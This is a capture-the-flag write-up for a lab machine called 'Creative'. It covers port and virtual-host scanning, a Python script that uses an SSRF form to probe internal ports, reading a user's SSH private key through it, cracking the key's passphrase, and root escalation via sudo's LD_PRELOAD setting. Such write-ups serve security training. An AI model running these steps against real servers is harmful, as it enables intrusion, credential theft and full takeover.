# Creative

Exploit a vulnerable web application and some misconfigurations to gain root privileges.

## Description

Please wait up to 5 minutes for the machine to boot up properly.

Submit both the user and root flags to complete the room.

## Challenges

1. What is user.txt?

`nmap -p- 10.10.16.153 -T4`

```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-30 04:31 BST
Nmap scan report for creative.thm (10.10.16.153)
Host is up (0.00033s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:67:9D:FC:92:6B (Unknown)
```

Add creative.thm to /etc/hosts

`gobuster dir -u http://creative.thm -w /usr/share/wordlists/dirb/common.txt` - nothing

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://creative.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/05/30 04:11:03 Starting gobuster
===============================================================
/assets (Status: 301)
/index.html (Status: 200)
===============================================================
2024/05/30 04:11:04 Finished
===============================================================
```

`ffuf -u http://creative.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -H "Host: FUZZ.creative.thm" -fw 6`

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 6
________________________________________________

:: Progress: [40/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro
beta                    [Status: 200, Size: 591, Words: 91, Lines: 20]
:: Progress: [434/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [906/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [2036/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [3254/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [4173/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [5199/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er
Beta                    [Status: 200, Size: 591, Words: 91, Lines: 20]
:: Progress: [6176/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [6406/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [7464/63087] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [8581/63087] :: Job [1/1] :: 15133 req/sec :: Duration: [0:00:01] ::: Progress: [9795/63087] :: Job [1/1] :: 7173 req/sec :: Duration: [0:00:01] :::: Progress: [10945/63087] :: Job [1/1] :: 6335 req/sec :: Duration: [0:00:01] ::: Progress: [12213/63087] :: Job [1/1] :: 5125 req/sec :: Duration: [0:00:01] ::: Progress: [13435/63087] :: Job [1/1] :: 14514 req/sec :: Duration: [0:00:01] :: Progress: [14490/63087] :: Job [1/1] :: 15846 req/sec :: Duration: [0:00:01] :: Progress: [15534/63087] :: Job [1/1] :: 14908 req/sec :: Duration: [0:00:01] 
BETA                    [Status: 200, Size: 591, Words: 91, Lines: 20]
:: Progress: [16262/63087] :: Job [1/1] :: 11919 req/sec :: Duration: [0:00:01] :: Progress: [16476/63087] :: Job [1/1] :: 10303 req/sec :: Duration: [0:00:01] :: Progress: [17597/63087] :: Job [1/1] :: 15629 req/sec :: Duration: [0:00:02] :: Progress: [18734/63087] :: Job [1/1] :: 12801 req/sec :: Duration: [0:00:02] :: Progress: [19722/63087] :: Job [1/1] :: 13171 req/sec :: Duration: [0:00:02] :: Progress: [20679/63087] :: Job [1/1] :: 8382 req/sec :: Duration: [0:00:02] ::: Progress: [21784/63087] :: Job [1/1] :: 6854 req/sec :: Duration: [0:00:02] ::: Progress: [22892/63087] :: Job [1/1] :: 8894 req/sec :: Duration: [0:00:02] ::: Progress: [23972/63087] :: Job [1/1] :: 13466 req/sec :: Duration: [0:00:02] :: Progress: [24930/63087] :: Job [1/1] :: 11686 req/sec :: Duration: [0:00:02] :: Progress: [26113/63087] :: Job [1/1] :: 15783 req/sec :: Duration: [0:00:03] :: Progress: [27433/63087] :: Job [1/1] :: 15761 req/sec :: Duration: [0:00:03] :: Progress: [28410/63087] :: Job [1/1] :: 8544 req/sec :: Duration: [0:00:03] ::: Progress: [29523/63087] :: Job [1/1] :: 5931 req/sec :: Duration: [0:00:03] ::: Progress: [30616/63087] :: Job [1/1] :: 14811 req/sec :: Duration: [0:00:03] :: Progress: [31734/63087] :: Job [1/1] :: 14233 req/sec :: Duration: [0:00:03] :: Progress: [32733/63087] :: Job [1/1] :: 11863 req/sec :: Duration: [0:00:03] :: Progress: [33861/63087] :: Job [1/1] :: 8044 req/sec :: Duration: [0:00:03] ::: Progress: [34923/63087] :: Job [1/1] :: 9250 req/sec :: Duration: [0:00:04] ::: Progress: [36083/63087] :: Job [1/1] :: 12439 req/sec :: Duration: [0:00:04] :: Progress: [37299/63087] :: Job [1/1] :: 6824 req/sec :: Duration: [0:00:04] ::: Progress: [38443/63087] :: Job [1/1] :: 6383 req/sec :: Duration: [0:00:04] ::: Progress: [39520/63087] :: Job [1/1] :: 9412 req/sec :: Duration: [0:00:04] ::: Progress: [40627/63087] :: Job [1/1] :: 9436 req/sec :: Duration: [0:00:04] ::: Progress: [41663/63087] :: Job [1/1] :: 13133 req/sec :: Duration: [0:00:04] :: Progress: [42814/63087] :: Job [1/1] :: 7196 req/sec :: Duration: [0:00:04] ::: Progress: [43803/63087] :: Job [1/1] :: 7954 req/sec :: Duration: [0:00:05] ::: Progress: [44675/63087] :: Job [1/1] :: 4302 req/sec :: Duration: [0:00:05] ::: Progress: [45926/63087] :: Job [1/1] :: 14048 req/sec :: Duration: [0:00:05] :: Progress: [46960/63087] :: Job [1/1] :: 5430 req/sec :: Duration: [0:00:05] ::: Progress: [48185/63087] :: Job [1/1] :: 15718 req/sec :: Duration: [0:00:05] :: Progress: [49333/63087] :: Job [1/1] :: 14732 req/sec :: Duration: [0:00:05] :: Progress: [50572/63087] :: Job [1/1] :: 16089 req/sec :: Duration: [0:00:05] :: Progress: [51697/63087] :: Job [1/1] :: 4245 req/sec :: Duration: [0:00:05] ::: Progress: [53000/63087] :: Job [1/1] :: 11850 req/sec :: Duration: [0:00:06] :: Progress: [54138/63087] :: Job [1/1] :: 8615 req/sec :: Duration: [0:00:06] ::: Progress: [55211/63087] :: Job [1/1] :: 13562 req/sec :: Duration: [0:00:06] :: Progress: [56516/63087] :: Job [1/1] :: 13951 req/sec :: Duration: [0:00:06] :: Progress: [57724/63087] :: Job [1/1] :: 9098 req/sec :: Duration: [0:00:06] ::: Progress: [58950/63087] :: Job [1/1] :: 6451 req/sec :: Duration: [0:00:06] ::: Progress: [60022/63087] :: Job [1/1] :: 6692 req/sec :: Duration: [0:00:06] ::: Progress: [61065/63087] :: Job [1/1] :: 7030 req/sec :: Duration: [0:00:06] ::: Progress: [61907/63087] :: Job [1/1] :: 11073 req/sec :: Duration: [0:00:07] :: Progress: [63065/63087] :: Job [1/1] :: 8280 req/sec :: Duration: [0:00:07] ::: Progress: [63087/63087] :: Job [1/1] :: 17888 req/sec :: Duration: [0:00:07] :: Progress: [63087/63087] :: Job [1/1] :: 17888 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Add beta.creative.thm to /etc/hosts

Check `http://beta.creative.thm/`

Looks like we can go to http://127.0.0.1 , but we need port...

Option 1: Bruteforce

```
import requests
import time

url = "http://beta.creative.thm"

data_template = "url=http%3A%2F%2F127.0.0.1%3A{}"

def send_post_request(port):
    data = data_template.format(port)
    try:
        response = requests.post(url, data=data, timeout=5)
        print(f"Port {port}: Status Code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Port {port}: Request failed ({e})")

for port in range(1, 65536):
    send_post_request(port)
    time.sleep(0.1)  # >102;O5< =51>;LHCN 7045@6:C <564C 70?@>A0<8
```
Option 2:
Check most common ports

```
7
20
21
22
23
25
53
69
80
88
102
110
135
137
139
143
381
383
443
464
465
587
593
636
691
902
989
990
993
995
1025
1194
1337
1589
1725
2082
2083
2483
2484
2967
3074
3306
3724
4664
5432
5900
6665
6666
6667
6668
6669
6881
6999
6970
8086
8087
8222
9100
10000
12345
27374
31337
```

LUCK - it's 1337!

After some manipulations we've got - `http://127.0.0.1:1337/home/saad/user.txt`

2. What is root.txt?

`http://127.0.0.1:1337/home/saad/.bash_history`

Try to connect vias SSH

Impossible without RSA. It can be find here - `http://127.0.0.1:1337/home/saad/.ssh/id_rsa`

`ssh -i id_rsa saad@10.10.16.153`

```
Enter passphrase for key 'id_rsa':
```

`john jtr-hash-49c139a65ca4fde5993dbf6dcd500486.txt --wordlist=/usr/share/wordlists/rockyou.txt`

`ssh -i id_rsa saad@10.10.16.153`

```
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 30 May 2024 04:28:46 AM UTC

  System load:  0.0               Processes:             115
  Usage of /:   57.4% of 8.02GB   Users logged in:       0
  Memory usage: 27%               IPv4 address for eth0: 10.10.16.153
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

58 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
saad@m4lware:~$ whoami
saad
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

Check for shell - `https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/`

```
saad@m4lware:~$ vim shell.c
saad@m4lware:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function \u2018_init\u2019:
shell.c:6:1: warning: implicit declaration of function \u2018setgid\u2019 [-Wimplicit-function-declaration]
    6 | setgid(0);
      | ^~~~~~
shell.c:7:1: warning: implicit declaration of function \u2018setuid\u2019 [-Wimplicit-function-declaration]
    7 | setuid(0);
      | ^~~~~~
saad@m4lware:~$ ls -la
total 76
drwxr-xr-x 7 saad saad  4096 May 30 04:37 .
drwxr-xr-x 3 root root  4096 Jan 20  2023 ..
-rw------- 1 saad saad   362 Jan 21  2023 .bash_history
-rw-r--r-- 1 saad saad   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 saad saad  3797 Jan 21  2023 .bashrc
drwx------ 2 saad saad  4096 Jan 20  2023 .cache
drwx------ 3 saad saad  4096 Jan 20  2023 .gnupg
drwxrwxr-x 3 saad saad  4096 Jan 20  2023 .local
-rw-r--r-- 1 saad saad   807 Feb 25  2020 .profile
-rw-rw-r-- 1 saad saad   144 May 30 04:36 shell.c
-rwxrwxr-x 1 saad saad 14760 May 30 04:37 shell.so
drwx------ 3 saad saad  4096 Jan 20  2023 snap
drwx------ 2 saad saad  4096 Jan 21  2023 .ssh
-rwxr-xr-x 1 root root   150 Jan 20  2023 start_server.py
-rw-r--r-- 1 saad saad     0 Jan 20  2023 .sudo_as_admin_successful
-rw-rw---- 1 saad saad    33 Jan 21  2023 user.txt
-rw------- 1 saad saad   788 May 30 04:36 .viminfo
saad@m4lware:~$ sudo LD_PRELOAD=./shell.so ping
# whoami
root
# cat /root/root.txt
```
